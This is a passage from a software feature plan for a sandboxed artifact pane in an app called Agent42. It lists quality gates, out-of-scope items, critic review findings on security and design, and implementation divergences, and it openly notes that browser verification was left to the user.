| New-code coverage | ≥ 80 % | `node .agentic/scripts/check-new-code-coverage.mjs` |
| Cognitive complexity | ≤ 15 (build error) | SonarAnalyzer S3776 via `dotnet build` |
| Vulnerable packages | 0 | CI package-freshness job |
| Format | clean | `dotnet format Agent42.slnx --verify-no-changes` |
| Branch | not `main` | `feature/artifact-pane` |

## Out of scope

- User editing in the pane, model targeted/diff edits (`str_replace`-style), and co-editing (phase 3).
- React/JSX compilation, Python execution, and any server-side execution of artifact code.
- Network access from artifacts (beyond cdnjs library loads, if kept) or persistence/storage inside them.
- Closing the self-navigation exfil channel (not possible with browser primitives; see ADR).
- Artifacts in incognito chats (refused).
- Deleting artifact blobs on conversation delete (inherits the attachment gap; noted in the ADR).
- Offline viewing of artifacts (`/api` is never SW-cached, by design).
- A UI for artifacts created via `/api/agent-run` or MCP-server consumers beyond the conversation
  itself. Loop-enabled stored agents creating duplicate artifacts per iteration.

## Review

Critic pass on 2026-10-03 (fresh context). Every finding below was accepted unless it is marked
rejected.

- **H1, incognito contradicted ADR 0034.** Fixed: in-tool `_ephemeral` refusal, no tool-side
  `WriteStateAsync`, AC 5.
- **H2, self-navigation exfil.** Fixed in the text: the claim "no content leaves" was removed and
  the residual is stated plainly. A measure-then-decide step covers cookie-bearing same-origin GETs
  (step 5). **User decision (2026-10-03): accept the residual** and record it in the ADR as an ADR
  0013 extension. **Keep the cdnjs allowance** as specified in the trap-2 CSP. Plans are approved; run
  phase 1 first.
- **H3, attachment proxies would render artifact blobs unsandboxed.** Fixed: octet-stream storage,
  nosniff on both proxies, AC 6/13, manual check.
- **M1, wrong persist sites; Retention precedent; reducer alternative; stub imitation.** Fixed in
  Context and steps 0/3.
- **M2, steps 6 and 7 contradicted each other.** Fixed: a classic `artifactpane.js` with injected
  `renderMarkdown`/URL builders, a thin app module, explicit SHELL/CACHE/asset-test items. The steps
  are now sequential.
- **M3, the code kind used a markdown fence.** Fixed: `textContent` + highlight.js.
- **M4, cards vanish from history.** Fixed: hook `AttachPendingToolCalls`, plus an "Artifacts in
  this chat" list fed from state. Rejected: persisting a per-turn reference. It would add a second
  positional join (the trap from the generated-image gotcha), and the list already makes artifacts
  reachable.
- **M5, share scope wording.** Fixed: every artifact in state, consistent with a live share; recorded
  as an ADR 0035 extension.
- **M6, ON for null-binding agents.** Accepted as a decision, recorded in Context and the ADR. Loop
  duplicates are out of scope.
- **LOW items.** Fixed: registration helper, extra ACs (purge, incognito, headers, svg, validation,
  ChatTurn round-trip, SHELL pane), conditional (a)/(b) AC rows, corrected persist-site list.

## Implementation divergences

Recorded at execution, 2026-10-03.

- **Agent Framework 1.22, not 1.19.** The repo moved on after planning. The spike was pinned to 1.22, and branch
  (a), compaction, shipped (see "Spike result"). No budget counter (`[Id(16)]`) exists.
- **Compaction's idempotence guard** matches exactly the two stubs it writes (`ArtifactLimits.StubPrefix`, and the
  refused-call stub), not "starts with `[`". The critic caught the wider guard, which would have left a JSON-array
  or `[TOC]` artifact uncompacted. `BracketLeadingContent_IsStillCompacted` pins it.
- **Grain surface:** only `GetArtifactsAsync()`. The endpoints pick the version from the record and read the blob
  through `IAttachmentStore` under the owner key, so there is no `GetArtifactVersionAsync`.
- **Pane API:** `Agent42ArtifactPane.create({ host, urls, renderMarkdown })` returns `{ renderCard(container,
  info, { beforeOpen }), open, close }`, rather than free functions `renderCard(bubble, info, opts)` /
  `openPane(host, info, …)`. One pane per page, and `beforeOpen` points the app's URL builders at the card's own
  conversation. The pane overlays the right edge, and on wide screens the body gets matching padding.
- **Test locations:** the compaction tests (`ArtifactUpdates_DoNotBlowTheSessionSizeBudget`,
  `CompactedArtifactCall_NextTurnSucceeds`) live in `ArtifactToolTests.cs`, not `AgentGrainTests.cs`. AC 17's
  SHELL assertion for the pane script went into the existing `ServiceWorkerShell_OmitsLazyLibs`, not a separate
  `ServiceWorkerShell_ListsArtifactPane`.
- **Test harness:** `FakeChatClient` gained `CallToolPrompt` (a scripted call with exact arguments). The arguments
  sit in a side table, not in the user prompt, and a capped `[call-result:…]` echo carries this turn's results.
  Both choices exist because the prompt and the reply are persisted, and would have put the measured bytes back
  into the session.
- **Collateral test updates:** `ToolResults_DoNotBlowTheSessionSizeBudget` now also subtracts the fake's echoed
  `[tools:…]` lists (three new tool names tipped it 422 bytes over 256 KB). This is the precedent of the
  rendering-hint exclusion. `ProjectLayoutTests` (folders, grain part), `ToolSelectionApiTests` (catalog key) and
  the three tests pinning the `CACHE` name were updated too.
- **Route-count comment** in `AgentApi.cs`: it said 64 but the tree had 65. It now says 71 (six artifact routes).
- **Extra DevHost triggers:** `make a markdown artifact` and `make a code artifact` (the code source contains a
  triple-backtick run), for manual checks of the other two kinds.
- **Step 10 (browser verification) was NOT run by the agent.** The Chrome extension was not connected, so the
  user takes the checklist. Verified over HTTP against DevHost with curl instead:
  - the exact CSP and the three other headers on `/frame`;
  - `/content` as `text/plain; charset=utf-8` with nosniff;
  - create → update → v1/v2 in the list;
  - history cards for both versions.

  For the step 5 measurement, a forged `/api/mcp/oauth/callback` returned `302 → /?mcp_oauth=error&reason=
  unknown_state`, and `/api/mcp/oauth/start?serverId=nope` returned `404`.
